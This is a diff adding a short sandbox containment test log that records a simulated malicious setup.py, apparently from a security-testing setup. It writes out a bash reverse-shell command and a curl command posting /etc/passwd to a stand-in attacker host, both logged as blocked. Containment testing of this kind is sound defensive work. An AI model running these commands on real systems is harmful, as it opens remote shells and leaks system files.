@@ -1,0 +1,8 @@
+=== CONTAINMENT TEST EXECUTION LOG ===
+Target Sandbox: sbx-containment01
+Attack Scenario: suspicious_package (malicious setup.py executing reverse shell & exfiltration)
+Payload Attempt 1: bash -i >& /dev/tcp/198.51.100.1/4444 0>&1
+Result: Intercepted and blocked by safety hook before execution.
+Payload Attempt 2: curl -X POST -d @/etc/passwd https://attacker-webhook.example.com
+Result: Dropped by Celesto zero-egress network policy.
+Kernel Isolation: Firecracker microVM boundary held with 0 host file system mutations.
